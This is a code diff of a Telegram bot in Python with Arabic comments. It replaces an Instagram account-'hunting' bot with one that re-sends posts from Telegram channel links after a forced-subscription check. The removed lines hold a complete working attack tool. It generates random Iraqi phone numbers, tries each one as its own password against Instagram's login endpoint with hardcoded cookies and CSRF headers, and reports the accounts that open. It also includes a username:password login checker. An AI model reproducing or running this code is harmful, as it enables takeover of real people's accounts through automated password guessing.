@@ -1,195 +1,123 @@
 import os
-import requests
-import random
-import time
 from telethon import TelegramClient, events, Button
+import re
 
-# Telegram bot settings
-api_id = os.getenv('API_ID')  # تأكد من تعيينها في بيئة التشغيل
-api_hash = os.getenv('API_HASH')  # تأكد من تعيينها في بيئة التشغيل
-bot_token = os.getenv('BOT_TOKEN')  # تأكد من تعيينها في بيئة التشغيل
-admin_id = int(os.getenv('ADMIN_ID'))  # تأكد من تعيينها في بيئة التشغيل
+# الحصول على بيانات API من المتغيرات البيئية
+api_id = os.environ.get('API_ID')
+api_hash = os.environ.get('API_HASH')
+bot_token = os.environ.get('BOT_TOKEN')
 
+# تهيئة العميل (Client)
 client = TelegramClient('bot', api_id, api_hash).start(bot_token=bot_token)
 
-hunting_sessions = {}
-authorized_users = set()
+# نمط (Regex) لاستخراج معلومات القناة ومعرف الرسالة من الروابط
+link_pattern = re.compile(r'https://t\.me/(?P<channel>\w+)/(?P<message_id>\d+)')
 
-# Load authorized users from file
-def load_authorized_users():
+# اسم القناة المطلوبة للاشتراك الإجباري
+required_channel = 'ir6qe'  # بدون @ أو https://t.me/
+
+# دالة للتحقق من اشتراك المستخدم في القناة باستخدام get_participants
+async def is_subscribed(user_id):
     try:
-        with open("authorized_users.txt", "r") as file:
-            for line in file:
-                authorized_users.add(int(line.strip()))
-    except FileNotFoundError:
-        pass
+        # الحصول على قائمة المشاركين في القناة
+        participants = await client.get_participants(required_channel)
+        
+        # التحقق مما إذا كان المستخدم موجودًا في قائمة المشاركين
+        for participant in participants:
+            if participant.id == user_id:
+                return True
+        return False
+    except Exception as e:
+        print(f"Error checking subscription: {e}")
+        return False
 
-# Save authorized users to file
-def save_authorized_users():
-    with open("authorized_users.txt", "w") as file:
-        for user_id in authorized_users:
-            file.write(f"{user_id}\n")
-
-# Check Instagram login using credentials
-def check_instagram_login(username, password):
-    cookies = {
-        'ig_did': '472E86DE-8910-4C69-9890-911D07AA8F54',
-        'ig_nrcb': '1',
-        'mid': 'ZeXFoAALAAF8QLNw4dTjYI_a9790',
-        'csrftoken': 'wmqJZ5SeoN3CGP6Bxg0WAY1lzOAw2GXz',
-    }
-
-    headers = {
-        'authority': 'www.instagram.com',
-        'accept': '*/*',
-        'content-type': 'application/x-www-form-urlencoded',
-        'origin': 'https://www.instagram.com',
-        'referer': 'https://www.instagram.com/',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36',
-        'x-csrftoken': 'wmqJZ5SeoN3CGP6Bxg0WAY1lzOAw2GXz',
-        'x-ig-app-id': '936619743392459',
-        'x-instagram-ajax': '1012127503',
-        'x-requested-with': 'XMLHttpRequest',
-    }
-
-    tim = str(time.time()).split('.')[0]
-    data = {
-        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{tim}:{password}',
-        'optIntoOneTap': 'false',
-        'username': username,
-    }
-
-    response = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', cookies=cookies, headers=headers, data=data)
-    return 'userId' in response.text
-
-# Start hunting process based on the chosen prefix
-async def start_hunting(event, prefix):
-    user_id = event.sender_id
-    if user_id not in authorized_users:
-        await event.reply("أنت غير مصرح لك باستخدام هذا البوت.")
-        return
-
-    hunting_sessions[user_id] = True
-    await event.reply(f"تم بدء عملية الصيد باستخدام المقدمة {prefix}!", buttons=[
-        [Button.inline("إيقاف الصيد", b'stop_hunting')]
-    ])
-
-    while hunting_sessions.get(user_id, False):
-        phone_number = generate_phone_number(prefix)
-        password = phone_number  # Set the password to the phone number itself
-        await event.edit(f"فحص الحساب: {phone_number}\nكلمة المرور: {password}",
-                        buttons=[[Button.inline("إيقاف الصيد", b'stop_hunting')]])
-
-        if check_instagram_login(phone_number, password):
-            await event.reply(f"تم العثور على حساب صالح: {phone_number} بكلمة مرور: {password}")
-        else:
-            time.sleep(3)  # Delay to avoid being blocked
-
-# Generate an Iraqi phone number based on the given prefix
-def generate_phone_number(prefix):
-    phone_number = prefix + random.choice('01234567') + ''.join(random.choices('0123456789', k=7))
-    return phone_number
-
-# Stop hunting process
-async def stop_hunting(event):
-    user_id = event.sender_id
-    if user_id not in authorized_users:
-        await event.reply("أنت غير مصرح لك باستخدام هذا البوت.")
-        return
-
-    hunting_sessions[user_id] = False
-    await event.reply("تم إيقاف عملية الصيد!")
-
-# Handle start command
+# دالة لمعالجة الأمر /start
 @client.on(events.NewMessage(pattern='/start'))
 async def start(event):
-    user_id = event.sender_id
-    if user_id == admin_id:
-        await event.reply('مرحبًا! اختر العملية التي تريدها:', buttons=[
-            [Button.inline("بدء الصيد بـ 077", b'start_077')],
-            [Button.inline("بدء الصيد بـ 078", b'start_078')],
-            [Button.inline("بدء الصيد بـ 075", b'start_075')],
-            [Button.inline("إيقاف الصيد", b'stop_hunting')],
-            [Button.inline("إضافة مستخدم", b'add_user')],
-            [Button.inline("إزالة مستخدم", b'remove_user')],
-            [Button.inline("عرض المستخدمين المصرح لهم", b'list_users')],
-            [Button.inline("اختبار تسجيل الدخول", b'login_test')]  # زر اختبار تسجيل الدخول
-        ])
-    elif user_id in authorized_users:
-        await event.reply('مرحبًا! اختر العملية التي تريدها:', buttons=[
-            [Button.inline("بدء الصيد بـ 077", b'start_077')],
-            [Button.inline("بدء الصيد بـ 078", b'start_078')],
-            [Button.inline("بدء الصيد بـ 075", b'start_075')],
-            [Button.inline("إيقاف الصيد", b'stop_hunting')],
-            [Button.inline("اختبار تسجيل الدخول", b'login_test')]  # زر اختبار تسجيل الدخول
-        ])
+    sender = await event.get_sender()
+
+    # التحقق من اشتراك المستخدم
+    if await is_subscribed(sender.id):
+        await event.reply(f"مرحبًا {sender.first_name}!\nأرسل لي رابط المنشور الذي تريد سحبه من القناة، وسأقوم بمعالجته لك.")
     else:
-        await event.reply("أنت غير مصرح لك باستخدام هذا البوت. يرجى الاتصال بالمسؤول.\n@VPN50")
+        # إرسال رسالة مع زر "تحقق من الاشتراك"
+        await event.reply(
+            f"مرحبًا {sender.first_name}!\nيرجى الاشتراك في القناة التالية لاستخدام البوت: https://t.me/{required_channel}",
+            buttons=[Button.inline("تحقق من الاشتراك", b'check_subscription')]
+        )
 
-# Handle button callbacks
-@client.on(events.CallbackQuery)
-async def callback(event):
-    data = event.data
-    user_id = event.sender_id
+# دالة للتعامل مع زر "تحقق من الاشتراك"
+@client.on(events.CallbackQuery(data=b'check_subscription'))
+async def check_subscription(event):
+    sender = await event.get_sender()
 
-    if data.startswith(b'start_'):
-        if data == b'start_077':
-            await start_hunting(event, '077')
-        elif data == b'start_078':
-            await start_hunting(event, '078')
-        elif data == b'start_075':
-            await start_hunting(event, '075')
+    # التحقق من اشتراك المستخدم
+    if await is_subscribed(sender.id):
+        await event.edit(f"شكرًا لاشتراكك! الآن يمكنك استخدام البوت.")
+    else:
+        await event.edit(f"لم تقم بالاشتراك بعد. يرجى الاشتراك في القناة: https://t.me/{required_channel}")
+
+# دالة لمعالجة الرسائل التي تحتوي على روابط فقط
+@client.on(events.NewMessage)
+async def handle_message(event):
+    sender = await event.get_sender()
+
+    # تجاهل الرد على الرسائل التي أرسلها البوت نفسه
+    if event.out:
+        return
     
-    elif data == b'stop_hunting':
-        await stop_hunting(event)
-    
-    elif data == b'add_user' and user_id == admin_id:
-        await event.reply("أرسل معرف المستخدم الذي تريد إضافته:")
+    # تجاهل الأمر '/start' لتجنب تكرار معالجته
+    if event.message.message.startswith('/start'):
+        return
+
+    # التحقق من اشتراك المستخدم فقط إذا كانت الرسالة تحتوي على رابط
+    if not await is_subscribed(sender.id):
+        await event.reply(f"يرجى الاشتراك في القناة التالية لاستخدام البوت: https://t.me/{required_channel}",
+                          buttons=[Button.inline("تحقق من الاشتراك", b'check_subscription')])
+        return
+
+    message = event.message.message
+
+    # التحقق من وجود رابط تليجرام في الرسالة
+    match = link_pattern.search(message)
+    if match:
+        channel = match.group('channel')
+        message_id = int(match.group('message_id'))
+
+        await event.reply(f"تم استلام الرابط من القناة: {channel}، معرف الرسالة: {message_id}. جاري معالجة المحتوى...")
         
-        @client.on(events.NewMessage(from_users=admin_id))
-        async def add_user_handler(event):
-            user_to_add = int(event.message.message)
-            authorized_users.add(user_to_add)
-            save_authorized_users()
-            await event.reply(f"تم إضافة المستخدم {user_to_add} بنجاح.")
-            client.remove_event_handler(add_user_handler)
+        # سحب المحتوى من القناة
+        await fetch_content(event.sender_id, channel, message_id)
+    else:
+        # تجاهل الرد على الرسائل التي لا تحتوي على رابط
+        return
 
-    elif data == b'remove_user' and user_id == admin_id:
-        await event.reply("أرسل معرف المستخدم الذي تريد إزالته:")
-        
-        @client.on(events.NewMessage(from_users=admin_id))
-        async def remove_user_handler(event):
-            user_to_remove = int(event.message.message)
-            if user_to_remove in authorized_users:
-                authorized_users.remove(user_to_remove)
-                save_authorized_users()
-                await event.reply(f"تم إزالة المستخدم {user_to_remove} بنجاح.")
-            else:
-                await event.reply(f"المستخدم {user_to_remove} غير موجود.")
-            await client.remove_event_handler(remove_user_handler)
+# دالة لسحب المحتوى من القناة
+async def fetch_content(user_id, channel, message_id):
+    try:
+        message = await client.get_messages(channel, ids=message_id)
 
-    elif data == b'login_test':
-        await event.reply("أرسل اسم المستخدم وكلمة المرور بالتنسيق 'اسم المستخدم:كلمة المرور'.")
+        if message:
+            # إعداد نص الرسالة للإرسال
+            response_text = ""
+            if message.text:
+                response_text += f"نص الرسالة: {message.text}\n"
 
-        @client.on(events.NewMessage(from_users=user_id))
-        async def login_test_handler(event):
-            credentials = event.message.message.split(":")
-            if len(credentials) != 2:
-                await event.reply("يرجى استخدام التنسيق الصحيح: 'اسم المستخدم:كلمة المرور'.")
-                return
-            
-            username, password = credentials[0].strip(), credentials[1].strip()
-            if check_instagram_login(username, password):
-                await event.reply(f"تم تسجيل الدخول بنجاح: {username}")
-            else:
-                await event.reply(f"فشل تسجيل الدخول للحساب: {username}")
+            # تحقق من وجود وسائط
+            if message.media:
+                # إضافة نص لإعلام المستخدم بالوسائط
+                response_text += "\n @ir6qe تم السحب بواسطة \n"
+                await client.send_file(user_id, message.media)
 
-            # Stop the handler after checking once
-            client.remove_event_handler(login_test_handler)
+            # إرسال النص إذا كان موجودًا
+            if response_text:
+                await client.send_message(user_id, response_text)
+        else:
+            await client.send_message(user_id, "لم يتم العثور على المحتوى المطلوب.")
+    except Exception as e:
+        await client.send_message(user_id, f"حدث خطأ أثناء سحب المحتوى: {str(e)}")
 
-# Load authorized users on startup
-load_authorized_users()
-
-# Start the bot
+# تشغيل البوت
 client.start()
+print("Bot is running...")
 client.run_until_disconnected()
